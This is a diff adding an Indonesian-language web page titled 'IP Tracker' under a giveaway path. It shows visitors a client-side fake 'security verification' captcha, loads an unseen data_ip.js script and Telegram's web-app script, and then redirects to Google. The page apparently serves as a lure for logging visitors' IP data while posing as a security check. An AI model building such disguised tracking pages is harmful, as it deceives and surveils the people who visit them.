@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>IP Tracker - Verifikasi Keamanan</title>
+    
+    <link rel="stylesheet" href="/giveaway/css/data_ip.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="captcha-page">
+        <div class="captcha-container">
+            <div class="captcha-header">
+                <i class="fas fa-shield-alt"></i>
+                <h2>Verifikasi Keamanan</h2>
+                <p>Silakan lengkapi verifikasi di bawah</p>
+            </div>
+            
+            <div class="captcha-box">
+                <div class="captcha-display" id="captchaDisplay">
+                    <span id="captchaCode">XXXXXX</span>
+                </div>
+                <div class="captcha-input-group">
+                    <input type="text" id="captchaInput" placeholder="Masukkan kode" maxlength="6" autocomplete="off">
+                    <button class="captcha-refresh" id="captchaRefresh">
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                </div>
+                <button class="captcha-verify" id="captchaVerify">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Verifikasi</span>
+                </button>
+                <div class="captcha-status" id="captchaStatus"></div>
+            </div>
+            
+            <div class="captcha-footer">
+                <p>Verifikasi ini diperlukan untuk melanjutkan</p>
+            </div>
+        </div>
+    </div>
+    
+    <script src="/giveaway/js/data_ip.js"></script>
+    
+    <script>
+        let captchaCode = '';
+        
+        function generateCaptcha() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            captchaCode = result;
+            document.getElementById('captchaCode').textContent = captchaCode;
+            document.getElementById('captchaInput').value = '';
+            document.getElementById('captchaStatus').innerHTML = '';
+            document.getElementById('captchaStatus').className = 'captcha-status';
+        }
+        
+        function verifyCaptcha() {
+            const input = document.getElementById('captchaInput').value.trim().toUpperCase();
+            const statusDiv = document.getElementById('captchaStatus');
+            
+            if (!input) {
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Masukkan kode';
+                statusDiv.className = 'captcha-status error';
+                return;
+            }
+            
+            if (input === captchaCode) {
+                statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Verifikasi berhasil! Mengalihkan...';
+                statusDiv.className = 'captcha-status success';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 1500);
+            } else {
+                statusDiv.innerHTML = '<i class="fas fa-times-circle"></i> Kode salah!';
+                statusDiv.className = 'captcha-status error';
+                generateCaptcha();
+            }
+        }
+        
+        document.getElementById('captchaRefresh').addEventListener('click', generateCaptcha);
+        document.getElementById('captchaVerify').addEventListener('click', verifyCaptcha);
+        document.getElementById('captchaInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') verifyCaptcha();
+        });
+        
+        generateCaptcha();
+    </script>
+</body>
+</html>
